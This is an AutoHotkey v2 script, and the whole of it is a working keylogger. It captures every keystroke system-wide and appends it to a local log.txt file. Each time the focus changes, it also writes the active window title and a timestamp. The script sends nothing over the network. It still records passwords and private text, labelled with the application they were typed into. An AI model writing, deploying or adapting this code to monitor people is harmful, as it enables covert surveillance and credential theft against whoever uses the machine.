#Requires AutoHotkey v2.0
#SingleInstance Force
Persistent()

; Initialize global variables
global logFile := "log.txt"
global lastWindow := ""

; Function to get the currently active window title
GetActiveWindowTitle() {
    return WinGetTitle("A")
}

; Function to get current timestamp
GetTimestamp() {
    return FormatTime(A_Now, "yyyy-MM-dd HH:mm:ss")
}

; Create an input hook
ih := InputHook()
ih.KeyOpt("{All}", "V")  ; Capture all keys in visible mode
ih.Start()

; Function to handle keystrokes
OnKeyPressed(ih, key) {
    global logFile, lastWindow
    
    try {
        ; Get current window title
        currentWindow := GetActiveWindowTitle()
        
        ; Check if window changed
        if (currentWindow != lastWindow) {
            lastWindow := currentWindow
            timestamp := GetTimestamp()
            FileAppend("`n[" currentWindow "] (" timestamp ")`n", logFile)
        }
        
        ; Handle key input
        keyToLog := key

        ; Handle special keys
        switch key {
            case " ": keyToLog := " "      ; Space
            case "`n": keyToLog := "`n"    ; Enter
            case "`t": keyToLog := "    "  ; Tab
            default:
                ; If it's a single character, handle shift state
                if (StrLen(key) = 1) {
                    if (GetKeyState("Shift", "P"))
                        keyToLog := StrUpper(key)
                }
        }
        
        ; Log the keystroke
        FileAppend(keyToLog, logFile)
    } catch Error as e {
        FileAppend("`nError logging keystroke: " e.Message "`n", logFile)
    }
}

; Additional hotkeys for special keys that might not be caught by InputHook
#HotIf true  ; Apply to all windows
~Space::FileAppend(" ", logFile)
~Enter::FileAppend("`n", logFile)
~Tab::FileAppend("    ", logFile)
#HotIf

; Bind the input hook events
ih.OnChar := OnKeyPressed

; Error handling for initial file creation
try {
    FileAppend("", logFile)
} catch Error as e {
    MsgBox("Error initializing log file: " e.Message)
    ExitApp()
}

; Exit hotkey
#q::ExitApp()
